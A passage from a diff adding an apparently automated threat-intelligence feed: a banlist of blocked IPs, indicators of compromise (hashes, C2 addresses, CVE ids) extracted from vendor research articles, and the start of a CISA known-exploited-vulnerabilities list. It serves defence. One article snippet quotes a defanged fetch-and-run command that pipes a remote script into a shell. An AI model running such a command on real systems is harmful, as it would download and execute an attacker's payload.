+      "value": "5.226.140.94",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "5.226.140.99",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "5.226.140.100",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "5.226.140.102",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "5.226.140.104",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "5.226.140.106",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "5.226.140.107",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "5.226.140.111",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "5.226.140.112",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "5.226.140.120",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "5.226.140.123",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "5.226.140.124",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "5.253.86.23",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "8.130.187.150",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "8.134.157.132",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "8.211.29.198",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "8.211.149.42",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "8.211.153.10",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "8.211.159.4",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "8.216.4.212",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "8.216.8.47",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "8.216.9.168",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "8.219.100.182",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "8.219.183.37",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "8.221.136.6",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "8.221.139.48",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "12.252.41.230",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "13.53.188.108",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "13.59.194.126",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "13.86.104.14",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "13.89.124.211",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    },
+    {
+      "value": "13.89.124.223",
+      "type": "ip",
+      "threat": "Artillery Banlist",
+      "source": "Binary Defense",
+      "source_url": "https://www.binarydefense.com",
+      "tags": [
+        "blocked"
+      ],
+      "first_seen": ""
+    }
+  ],
+  "extracted_iocs": [
+    {
+      "value": "eb07edaa2786cfddfa4c15526168f2200d85300aee0a8f253b32d2462a7b0bcd",
+      "type": "sha256",
+      "source_name": "Unit 42",
+      "article_title": "Phantom Squatting: AI-Hallucinated Domains as a Software Supply Chain Vector",
+      "article_url": "https://unit42.paloaltonetworks.com/phantom-squatting-hallucinated-web-domains/",
+      "article_date": "Wed, 01 Jul 2026 01:00:11 +0000",
+      "context": "dacted indicators are available on request. \n SHA256 hash:  eb07edaa2786cfddfa4c15526168f2200d85300aee0a8f253b32d2462a7b"
+    },
+    {
+      "value": "2202a30daad9928ef47cca5f4ab04ce083692a94428e386fa01c2dd44557e34b",
+      "type": "sha256",
+      "source_name": "Unit 42",
+      "article_title": "Phantom Squatting: AI-Hallucinated Domains as a Software Supply Chain Vector",
+      "article_url": "https://unit42.paloaltonetworks.com/phantom-squatting-hallucinated-web-domains/",
+      "article_date": "Wed, 01 Jul 2026 01:00:11 +0000",
+      "context": "tional Postal Delivery Service APK Campaign \n SHA256 hash:  2202a30daad9928ef47cca5f4ab04ce083692a94428e386fa01c2dd44557"
+    },
+    {
+      "value": "00e09754526d0fe836ba27e3144ae161b0ecd3774abec5560504a16a67f0087c",
+      "type": "sha256",
+      "source_name": "Unit 42",
+      "article_title": "CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure",
+      "article_url": "https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/",
+      "article_date": "Thu, 25 Jun 2026 22:00:52 +0000",
+      "context": "ompromise \n   SHA256 Hashes \n  chrome_setup.zip  file: \n \n  00e09754526d0fe836ba27e3144ae161b0ecd3774abec5560504a16a67f0"
+    },
+    {
+      "value": "139.180.134.221",
+      "type": "ip",
+      "source_name": "Unit 42",
+      "article_title": "CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure",
+      "article_url": "https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/",
+      "article_date": "Thu, 25 Jun 2026 22:00:52 +0000",
+      "context": "o the campaign's infrastructure, we observed the server at  139.180.134.221  hosting a suspicious executable named  Perf"
+    },
+    {
+      "value": "45.32.113.172",
+      "type": "ip",
+      "source_name": "Unit 42",
+      "article_title": "CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure",
+      "article_url": "https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/",
+      "article_date": "Thu, 25 Jun 2026 22:00:52 +0000",
+      "context": "s a persistent communication channel with the C2 server at  45.32.113.172 . The malware uses standard HTTP for network t"
+    },
+    {
+      "value": "202.182.102.5",
+      "type": "ip",
+      "source_name": "Unit 42",
+      "article_title": "CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure",
+      "article_url": "https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/",
+      "article_date": "Thu, 25 Jun 2026 22:00:52 +0000",
+      "context": "\n \n   C2 Servers \n IPv4 addresses: \n \n  139.180.134.221  \n  202.182.102.5  \n  45.76.210.43  \n  45.32.113.172  \n \n URLs: "
+    },
+    {
+      "value": "45.76.210.43",
+      "type": "ip",
+      "source_name": "Unit 42",
+      "article_title": "CL-STA-1062 Targets Southeast Asian Governments and Critical Infrastructure",
+      "article_url": "https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/",
+      "article_date": "Thu, 25 Jun 2026 22:00:52 +0000",
+      "context": " IPv4 addresses: \n \n  139.180.134.221  \n  202.182.102.5  \n  45.76.210.43  \n  45.32.113.172  \n \n URLs: \n \n  http://139.18"
+    },
+    {
+      "value": "CVE-2026-20182",
+      "type": "cve",
+      "source_name": "Cisco Talos",
+      "article_title": "ARToken: Inside an EvilTokens affiliate panel targeting Microsoft 365",
+      "article_url": "https://blog.talosintelligence.com/artoken-inside-an-eviltokens-affiliate-panel-targeting-microsoft-365/",
+      "article_date": "Wed, 01 Jul 2026 10:00:38 GMT",
+      "context": " is tracking the active exploitation of CVE-2026-20182, an authentication bypass vulnerability"
+    },
+    {
+      "value": "CVE-2025-20333",
+      "type": "cve",
+      "source_name": "Cisco Talos",
+      "article_title": "ARToken: Inside an EvilTokens affiliate panel targeting Microsoft 365",
+      "article_url": "https://blog.talosintelligence.com/artoken-inside-an-eviltokens-affiliate-panel-targeting-microsoft-365/",
+      "article_date": "Wed, 01 Jul 2026 10:00:38 GMT",
+      "context": "T-4356 exploited n-day vulnerabilities (CVE-2025-20333 and CVE-2025-20362) to gain unauthorize"
+    },
+    {
+      "value": "CVE-2025-20362",
+      "type": "cve",
+      "source_name": "Cisco Talos",
+      "article_title": "ARToken: Inside an EvilTokens affiliate panel targeting Microsoft 365",
+      "article_url": "https://blog.talosintelligence.com/artoken-inside-an-eviltokens-affiliate-panel-targeting-microsoft-365/",
+      "article_date": "Wed, 01 Jul 2026 10:00:38 GMT",
+      "context": "day vulnerabilities (CVE-2025-20333 and CVE-2025-20362) to gain unauthorized access to vulnera"
+    },
+    {
+      "value": "9f1f11a708d393e0a4109ae189bc64f1f3e312653dcf317a2bd406f18ffcc507",
+      "type": "sha256",
+      "source_name": "Cisco Talos",
+      "article_title": "Beyond IOCs: AI-enabled threat intelligence",
+      "article_url": "https://blog.talosintelligence.com/beyond-iocs-ai-enabled-threat-intelligence/",
+      "article_date": "Thu, 25 Jun 2026 18:00:26 GMT",
+      "context": "re files from Talos telemetry over the past week    SHA256: 9f1f11a708d393e0a4109ae189bc64f1f3e312653dcf317a2bd406f18ffc"
+    },
+    {
+      "value": "9896a6fcb9bb5ac1ec5297b4a65be3f647589adf7c37b45f3f7466decd6a4a7f",
+      "type": "sha256",
+      "source_name": "Cisco Talos",
+      "article_title": "Beyond IOCs: AI-enabled threat intelligence",
+      "article_url": "https://blog.talosintelligence.com/beyond-iocs-ai-enabled-threat-intelligence/",
+      "article_date": "Thu, 25 Jun 2026 18:00:26 GMT",
+      "context": "exe   Detection Name: Win.Worm.Coinminer::1201**    SHA256: 9896a6fcb9bb5ac1ec5297b4a65be3f647589adf7c37b45f3f7466decd6a"
+    },
+    {
+      "value": "afc8a00883a4ea07df2dc1d4ed02f8a23b35c9456413b438a2d9ce3ae5076638",
+      "type": "sha256",
+      "source_name": "Cisco Talos",
+      "article_title": "Beyond IOCs: AI-enabled threat intelligence",
+      "article_url": "https://blog.talosintelligence.com/beyond-iocs-ai-enabled-threat-intelligence/",
+      "article_date": "Thu, 25 Jun 2026 18:00:26 GMT",
+      "context": ".exe  Detection Name: Win.Tool.Procpatcher::1201    SHA256: afc8a00883a4ea07df2dc1d4ed02f8a23b35c9456413b438a2d9ce3ae507"
+    },
+    {
+      "value": "e60ab99da105ee27ee09ea64ed8eb46d8edc92ee37f039dbc3e2bb9f587a33ba",
+      "type": "sha256",
+      "source_name": "Cisco Talos",
+      "article_title": "Beyond IOCs: AI-enabled threat intelligence",
+      "article_url": "https://blog.talosintelligence.com/beyond-iocs-ai-enabled-threat-intelligence/",
+      "article_date": "Thu, 25 Jun 2026 18:00:26 GMT",
+      "context": " Detection Name: PUA.Win.Tool.Kmsactivator::1201    SHA256: e60ab99da105ee27ee09ea64ed8eb46d8edc92ee37f039dbc3e2bb9f587a"
+    },
+    {
+      "value": "853baab97b1f3b03c1ffa55797e87867f5fb7ce33457411f56afd270cb395453",
+      "type": "sha256",
+      "source_name": "Cisco Talos",
+      "article_title": "Beyond IOCs: AI-enabled threat intelligence",
+      "article_url": "https://blog.talosintelligence.com/beyond-iocs-ai-enabled-threat-intelligence/",
+      "article_date": "Thu, 25 Jun 2026 18:00:26 GMT",
+      "context": "tion Name: W32.Variant:MalwareXgenMisc.29d4.1201    SHA256: 853baab97b1f3b03c1ffa55797e87867f5fb7ce33457411f56afd270cb39"
+    },
+    {
+      "value": "2915b3f8b703eb744fc54c81f4a9c67f",
+      "type": "md5",
+      "source_name": "Cisco Talos",
+      "article_title": "Beyond IOCs: AI-enabled threat intelligence",
+      "article_url": "https://blog.talosintelligence.com/beyond-iocs-ai-enabled-threat-intelligence/",
+      "article_date": "Thu, 25 Jun 2026 18:00:26 GMT",
+      "context": "3e0a4109ae189bc64f1f3e312653dcf317a2bd406f18ffcc507    MD5: 2915b3f8b703eb744fc54c81f4a9c67f   Talos Rep:   https://talo"
+    },
+    {
+      "value": "38de5b216c33833af710e88f7f64fc98",
+      "type": "md5",
+      "source_name": "Cisco Talos",
+      "article_title": "Beyond IOCs: AI-enabled threat intelligence",
+      "article_url": "https://blog.talosintelligence.com/beyond-iocs-ai-enabled-threat-intelligence/",
+      "article_date": "Thu, 25 Jun 2026 18:00:26 GMT",
+      "context": "5ac1ec5297b4a65be3f647589adf7c37b45f3f7466decd6a4a7f   MD5: 38de5b216c33833af710e88f7f64fc98   Talos Rep:   https://talo"
+    },
+    {
+      "value": "cc4d231df34e57f59eb970353c7d9de2",
+      "type": "md5",
+      "source_name": "Cisco Talos",
+      "article_title": "Beyond IOCs: AI-enabled threat intelligence",
+      "article_url": "https://blog.talosintelligence.com/beyond-iocs-ai-enabled-threat-intelligence/",
+      "article_date": "Thu, 25 Jun 2026 18:00:26 GMT",
+      "context": "ea07df2dc1d4ed02f8a23b35c9456413b438a2d9ce3ae5076638   MD5: cc4d231df34e57f59eb970353c7d9de2   Talos Rep:   https://talo"
+    },
+    {
+      "value": "dbd8dbecaa80795c135137d69921fdba",
+      "type": "md5",
+      "source_name": "Cisco Talos",
+      "article_title": "Beyond IOCs: AI-enabled threat intelligence",
+      "article_url": "https://blog.talosintelligence.com/beyond-iocs-ai-enabled-threat-intelligence/",
+      "article_date": "Thu, 25 Jun 2026 18:00:26 GMT",
+      "context": "ee27ee09ea64ed8eb46d8edc92ee37f039dbc3e2bb9f587a33ba   MD5: dbd8dbecaa80795c135137d69921fdba  Talos Rep:   https://talos"
+    },
+    {
+      "value": "41acb30b9d662d48b7b4fc0ac3d4b79f",
+      "type": "md5",
+      "source_name": "Cisco Talos",
+      "article_title": "Beyond IOCs: AI-enabled threat intelligence",
+      "article_url": "https://blog.talosintelligence.com/beyond-iocs-ai-enabled-threat-intelligence/",
+      "article_date": "Thu, 25 Jun 2026 18:00:26 GMT",
+      "context": "3b03c1ffa55797e87867f5fb7ce33457411f56afd270cb395453   MD5: 41acb30b9d662d48b7b4fc0ac3d4b79f  Talos Rep:   https://talos"
+    },
+    {
+      "value": "b32810973132d11afd61ccee222bbb79",
+      "type": "md5",
+      "source_name": "Kaspersky Securelist",
+      "article_title": "The SOC Files: ScreenConnect masked as freeware. An inside look at a large-scale campaign",
+      "article_url": "https://securelist.com/tr/the-soc-files-screenconnect-campaign-with-asyncrat/120472/",
+      "article_date": "Wed, 01 Jul 2026 10:00:51 +0000",
+      "context": "ious objects. \n     \n Indicators of compromise \n Loaders \n  B32810973132D11AFD61CCEE222BBB79  \n 5B7E1FE55BD7B5EA54BD4ED1"
+    },
+    {
+      "value": "162.216.241.242",
+      "type": "ip",
+      "source_name": "Kaspersky Securelist",
+      "article_title": "The SOC Files: ScreenConnect masked as freeware. An inside look at a large-scale campaign",
+      "article_url": "https://securelist.com/tr/the-soc-files-screenconnect-campaign-with-asyncrat/120472/",
+      "article_date": "Wed, 01 Jul 2026 10:00:51 +0000",
+      "context": " investigation    Fake domain infrastructure     Cluster 1: 162.216.241.242 and 198.23.185.81    Cluster 2: 2.59.134.97 "
+    },
+    {
+      "value": "198.23.185.81",
+      "type": "ip",
+      "source_name": "Kaspersky Securelist",
+      "article_title": "The SOC Files: ScreenConnect masked as freeware. An inside look at a large-scale campaign",
+      "article_url": "https://securelist.com/tr/the-soc-files-screenconnect-campaign-with-asyncrat/120472/",
+      "article_date": "Wed, 01 Jul 2026 10:00:51 +0000",
+      "context": "ke domain infrastructure     Cluster 1: 162.216.241.242 and 198.23.185.81    Cluster 2: 2.59.134.97     C2 infrastructur"
+    },
+    {
+      "value": "2.59.134.97",
+      "type": "ip",
+      "source_name": "Kaspersky Securelist",
+      "article_title": "The SOC Files: ScreenConnect masked as freeware. An inside look at a large-scale campaign",
+      "article_url": "https://securelist.com/tr/the-soc-files-screenconnect-campaign-with-asyncrat/120472/",
+      "article_date": "Wed, 01 Jul 2026 10:00:51 +0000",
+      "context": " Cluster 1: 162.216.241.242 and 198.23.185.81    Cluster 2: 2.59.134.97     C2 infrastructure analysis    Takeaways    D"
+    },
+    {
+      "value": "185.254.97.249",
+      "type": "ip",
+      "source_name": "Kaspersky Securelist",
+      "article_title": "The SOC Files: ScreenConnect masked as freeware. An inside look at a large-scale campaign",
+      "article_url": "https://securelist.com/tr/the-soc-files-screenconnect-campaign-with-asyncrat/120472/",
+      "article_date": "Wed, 01 Jul 2026 10:00:51 +0000",
+      "context": "oad.giize.com  \n ScreenConnect C2 \n  servermanagemen.xyz  \n 185.254.97.249  \n r.manage-server.xyz  \n 45.145.41.205  \n wi"
+    },
+    {
+      "value": "45.145.41.205",
+      "type": "ip",
+      "source_name": "Kaspersky Securelist",
+      "article_title": "The SOC Files: ScreenConnect masked as freeware. An inside look at a large-scale campaign",
+      "article_url": "https://securelist.com/tr/the-soc-files-screenconnect-campaign-with-asyncrat/120472/",
+      "article_date": "Wed, 01 Jul 2026 10:00:51 +0000",
+      "context": "ermanagemen.xyz  \n 185.254.97.249  \n r.manage-server.xyz  \n 45.145.41.205  \n winservec.net  \n manageserver.xyz  \n clouds"
+    },
+    {
+      "value": "CVE-2025-55182",
+      "type": "cve",
+      "source_name": "Kaspersky Securelist",
+      "article_title": "OpenClaw: risks for the users and how to mitigate them",
+      "article_url": "https://securelist.com/openclaw-security/120484/",
+      "article_date": "Wed, 01 Jul 2026 06:42:48 +0000",
+      "context": " \n\t\t \n\t\t\t\n\t\t\t\n\t\t\t  It didn’t take long: CVE-2025-55182 is now under active exploitation  \t\t \n\t"
+    },
+    {
+      "value": "540d78d1b48059f41d1e44f29bb255cfc4c3d628c2a4e2478fcca311c955c232",
+      "type": "sha256",
+      "source_name": "Trend Micro",
+      "article_title": "TONResolver RAT Abuses TON Blockchain to Target Japan's Hotel Industry",
+      "article_url": "https://www.trendmicro.com/en_us/research/26/f/tonresolver.html",
+      "article_date": "Mon, 29 Jun 2026 00:00:00 +0000",
+      "context": "\n  Hash  \n  Summary  \n   1770471436 \n 2026-02-07 13:37:16 \n 540d78d1b48059f41d1e44f29bb255cfc4c3d628c2a4e2478fcca311c955"
+    },
+    {
+      "value": "CVE-2026-33017",
+      "type": "cve",
+      "source_name": "Trend Micro",
+      "article_title": "TONResolver RAT Abuses TON Blockchain to Target Japan's Hotel Industry",
+      "article_url": "https://www.trendmicro.com/en_us/research/26/f/tonresolver.html",
+      "article_date": "Mon, 29 Jun 2026 00:00:00 +0000",
+      "context": "\t \n\t\t\t\t\tFrom Langflow to Monero: Inside CVE-2026-33017 Cryptominer\n\t\t\t\t  \n\t\t\t \n\t\t\n\t\t\t \n\t\t\t\t \n\t"
+    },
+    {
+      "value": "46096a72d84db5f1dafd944fcf6571c8",
+      "type": "md5",
+      "source_name": "Trend Micro",
+      "article_title": "From Langflow to Monero: Inside CVE-2026-33017 Cryptominer",
+      "article_url": "https://www.trendmicro.com/en_us/research/26/f/from-langflow-to-monero-inside-cve-2026-33017-cryptominer.html",
+      "article_date": "Tue, 23 Jun 2026 00:00:00 +0000",
+      "context": "s.tar  \n  Verifies its MD5 hash against a hardcoded value ( 46096a72d84db5f1dafd944fcf6571c8 )  \n  Extracts the payload "
+    },
+    {
+      "value": "CVE-2025-3248",
+      "type": "cve",
+      "source_name": "Trend Micro",
+      "article_title": "From Langflow to Monero: Inside CVE-2026-33017 Cryptominer",
+      "article_url": "https://www.trendmicro.com/en_us/research/26/f/from-langflow-to-monero-inside-cve-2026-33017-cryptominer.html",
+      "article_date": "Tue, 23 Jun 2026 00:00:00 +0000",
+      "context": " shipped this class of bug. The first,  CVE-2025-3248 , was exploited in June 2025 by the Flo"
+    },
+    {
+      "value": "83.142.209.214",
+      "type": "ip",
+      "source_name": "Trend Micro",
+      "article_title": "From Langflow to Monero: Inside CVE-2026-33017 Cryptominer",
+      "article_url": "https://www.trendmicro.com/en_us/research/26/f/from-langflow-to-monero-inside-cve-2026-33017-cryptominer.html",
+      "article_date": "Tue, 23 Jun 2026 00:00:00 +0000",
+      "context": "thon script executes __import__('os').system('curl http[://]83.142.209.214:8080/isp.sh | sh'). That one line drops the r"
+    },
+    {
+      "value": "94.156.64.241",
+      "type": "ip",
+      "source_name": "Trend Micro",
+      "article_title": "From Langflow to Monero: Inside CVE-2026-33017 Cryptominer",
+      "article_url": "https://www.trendmicro.com/en_us/research/26/f/from-langflow-to-monero-inside-cve-2026-33017-cryptominer.html",
+      "article_date": "Tue, 23 Jun 2026 00:00:00 +0000",
+      "context": "  /var/tmp/init_rmount   at 1,170 bytes, with C&C server at 94.156.64.241; beacons to   /r.php   with victim public IP i"
+    },
+    {
+      "value": "CVE-2026-35273",
+      "type": "cve",
+      "source_name": "Trend Micro",
+      "article_title": "PeopleSoft PeopleTools Pre-Authentication RCE: A PSIGW SSRF Chain That Executes Inside the JVM",
+      "article_url": "https://www.trendmicro.com/en_us/research/26/f/PeopleTools.html",
+      "article_date": "Thu, 18 Jun 2026 00:00:00 +0000",
+      "context": "coder deserialization. Oracle assigned  CVE-2026-35273  (CVSS 9.8) and released an out-of-band"
+    },
+    {
+      "value": "20.38.0.172",
+      "type": "ip",
+      "source_name": "Unit 42 (GitHub)",
+      "article_title": "2026-06-29-FIFA-themed-email-scam-for-credit-card-theft.txt",
+      "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-06-29-FIFA-themed-email-scam-for-credit-card-theft.txt",
+      "article_date": "2026-07-02T09:17:49.573158+00:00",
+      "context": "c7wbclk.com/?nid=2106 - Conversion postback\n\nIP ADDRESS:\n\n- 20.38.0.172 - Sending IP address from the email headers\n"
+    },
+    {
+      "value": "fc2907fa866f86e0821f75060a331ce69ee10ff3aa374587993b17ba5406fa33",
+      "type": "sha256",
+      "source_name": "Unit 42 (GitHub)",
+      "article_title": "2026-06-28-Fake-IT-support-abuses-Teams-to-deliver-EtherRAT.txt",
+      "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-06-28-Fake-IT-support-abuses-Teams-to-deliver-EtherRAT.txt",
+      "article_date": "2026-07-02T09:17:50.100942+00:00",
+      "context": "9)\n- necropatia.com (fallback C2 domain)\n\nSHA256 HASHES:\n\n- fc2907fa866f86e0821f75060a331ce69ee10ff3aa374587993b17ba5406"
+    },
+    {
+      "value": "780df6caac0227c3a8c0e70417aa38cddc50e0aed61c76cc836f306809767894",
+      "type": "sha256",
+      "source_name": "Unit 42 (GitHub)",
+      "article_title": "2026-06-25-IOCs-from-KongTuke-activity.txt",
+      "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-06-25-IOCs-from-KongTuke-activity.txt",
+      "article_date": "2026-07-02T09:17:50.628866+00:00",
+      "context": "itly load the malicious proxy loader)\n     --- SHA256 hash: 780df6caac0227c3a8c0e70417aa38cddc50e0aed61c76cc836f30680976"
+    },
+    {
+      "value": "c4cb401430c921daf604d4ff767a698431955eeae580e8bb28f287bd6384aa2d",
+      "type": "sha256",
+      "source_name": "Unit 42 (GitHub)",
+      "article_title": "2026-06-25-IOCs-from-KongTuke-activity.txt",
+      "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-06-25-IOCs-from-KongTuke-activity.txt",
+      "article_date": "2026-07-02T09:17:50.628866+00:00",
+      "context": "ing the anti-sandbox 62-second sleep)\n     --- SHA256 hash: c4cb401430c921daf604d4ff767a698431955eeae580e8bb28f287bd6384"
+    },
+    {
+      "value": "b99db956f479e0390d83da3279ef1bb93a80db0eaf2b284491570dd8157684df",
+      "type": "sha256",
+      "source_name": "Unit 42 (GitHub)",
+      "article_title": "2026-06-25-IOCs-from-KongTuke-activity.txt",
+      "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-06-25-IOCs-from-KongTuke-activity.txt",
+      "article_date": "2026-07-02T09:17:50.628866+00:00",
+      "context": "rce-hide process windows via SW_HIDE)\n     --- SHA256 hash: b99db956f479e0390d83da3279ef1bb93a80db0eaf2b284491570dd81576"
+    },
+    {
+      "value": "cc1023616fba7fc7585ae7872f6a6b77a84a8a461e585b95f01f9de2b703b433",
+      "type": "sha256",
+      "source_name": "Unit 42 (GitHub)",
+      "article_title": "2026-06-25-IOCs-from-KongTuke-activity.txt",
+      "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-06-25-IOCs-from-KongTuke-activity.txt",
+      "article_date": "2026-07-02T09:17:50.628866+00:00",
+      "context": "tion, and EnumTimeFormatsEx callback)\n     --- SHA256 hash: cc1023616fba7fc7585ae7872f6a6b77a84a8a461e585b95f01f9de2b703"
+    },
+    {
+      "value": "45.227.255.75",
+      "type": "ip",
+      "source_name": "Unit 42 (GitHub)",
+      "article_title": "2026-06-25-IOCs-from-KongTuke-activity.txt",
+      "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-06-25-IOCs-from-KongTuke-activity.txt",
+      "article_date": "2026-07-02T09:17:50.628866+00:00",
+      "context": "ll URL hosting malicious MSI installer)\n  -- awsnetstat.com/45.227.255.75 (C2 server observed in post-exploitation and e"
+    }
+  ],
+  "cisa_kev": [
+    {
+      "cve_id": "CVE-2026-45659",
+      "vendor": "Microsoft",
+      "product": "SharePoint Server",
+      "name": "Microsoft SharePoint Server Deserialization of Untrusted Data Vulnerability",
+      "description": "Microsoft SharePoint Server contains a deserialization of untrusted data vulnerability which allows an authorized attacker to execute code over a network.",
+      "date_added": "2026-07-01",
+      "due_date": "2026-07-04",
+      "required_action": "Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirements” (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+      "known_ransomware": "Unknown"
+    },
+    {
+      "cve_id": "CVE-2026-48558",
+      "vendor": "SimpleHelp ",
+      "product": "SimpleHelp",
